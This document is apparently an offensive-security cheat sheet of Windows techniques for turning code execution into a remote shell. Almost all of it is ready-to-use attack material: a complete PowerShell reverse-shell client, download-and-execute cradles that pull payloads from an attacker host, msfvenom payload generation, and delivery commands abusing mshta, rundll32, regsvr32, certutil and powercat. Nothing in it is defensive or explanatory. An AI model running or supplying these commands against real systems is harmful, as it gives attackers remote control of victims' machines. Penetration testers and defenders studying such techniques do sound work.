# Windows code exec to shell

### Windows one-liners

```text
https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
```

### powershell.exe

{% code title="shell.ps1" %}
```text
$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

```text
# serve shell.ps1
python3 -m http.server <port>

# execute on target
powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LPORT>/shell.ps1\");"
```

#### Creating encoded powershell commands on linux

```text
echo -n "IEX (New-Object Net.WebClient).downloadstring('<thing_to_execute>')" | iconv --to-code UTF-16LE | base64 -w 0
```

### mshta.exe

Runs .hta \(HTML Application\) files

```text
# first, we generate hta-psh file with msfvenom
msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f hta-psh -o <file>.hta

# then we start server
python3 -m http.server <port>

# and run command on target host
mshta.exe http://<LHOST>:<port>/<file>.hta
```

```text
use exploit/windows/misc/hta_server

mshta.exe http://<attacker>/<path>.hta
```

### rundll32.exe

```text
# first, we generate dll file with msfvenom
msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o <file>.dll

# serve a file throught smb
sudo python3 ../smbserver.py -smb2support -user <user> -password <pass> <share> `pwd`

# execute on target
rundll32.exe \\<lhost>\<share>\<file>.dll,0
```

```text
use exploit/windows/smb/smb_delivery

rundll32.exe \\<attacker>\<path>\<file>.dll,0
```

### regsrv32.exe

```text
use exploit/multi/script/web_delivery

regsvr32 /s /n /u /i:http://<attacker>:<p>/<file>.sct scrobj.dll
```

### certutil.exe

```text
msfvenom -p windows/meterpreter/reverse_tcp lhost=<lhost> lport=<lport> -f exe > shell.exe

# host generated file
python3 -m http.server 80

# start listener (exploit/multi/handler)

certutil.exe -urlcache -split -f http://<target>/shell.exe shell.exe & shell.exe
```

### powershell.exe \(with powercat\)

```text
git clone https://github.com/besimorhino/powercat.git
python -m SimpleHTTPServer 80

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker>/powercat.ps1');powercat -c <attacker> -p <port> -e cmd"
```

### more ...

```text
https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/
```

